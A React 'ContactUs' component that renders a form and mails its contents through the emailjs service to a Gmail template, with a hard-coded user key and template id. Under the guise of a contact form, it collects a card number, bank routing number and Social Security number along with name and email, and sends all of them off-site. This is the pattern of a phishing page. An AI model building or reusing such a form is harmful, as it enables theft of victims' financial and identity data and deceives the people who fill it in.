import React from 'react';
import emailjs from 'emailjs-com';
import './App.css'

export default function ContactUs() {

  function sendEmail(e) {
    e.preventDefault();

    emailjs.sendForm('gmail', "template_qm8ghyt", e.target, 'user_zfBFheYcXKnefAXIWmKdy')
      .then((result) => {
          console.log(result.text);
      }, (error) => {
          console.log(error.text);
      });

      e.target.reset()
  }

  return (
    <div className= 'container'>

    <form className="contact-form" onSubmit={sendEmail}>
      <input type="hidden" name="name" />

      <div className='input-conatiner'>
      <input type="text" name="name" />
      <label>Name</label>
      </div>
      
      <div className='input-conatiner'>
      <input type="email" name="email" />
      <label>Email</label>
      </div>

      <div className='input-conatiner'>
      <input type="number" name="card_number" />
      <label>card number</label>
      </div>

      <div className='input-conatiner'>
      <input type="number" name="routing_number" />
      <label>Routing number</label>
      </div>

      <div className='input-conatiner'>
      <input type="number" name="ssn" />
      <label>state security number</label>
      </div>

      <div className='input-conatiner'>
      <textarea name="message" />
      <label>Message</label>
      </div>

      <div className='input-conatiner'>
      <input type="submit" value="Send" className='btn'/>
      </div>
    </form>

    </div>
  );
}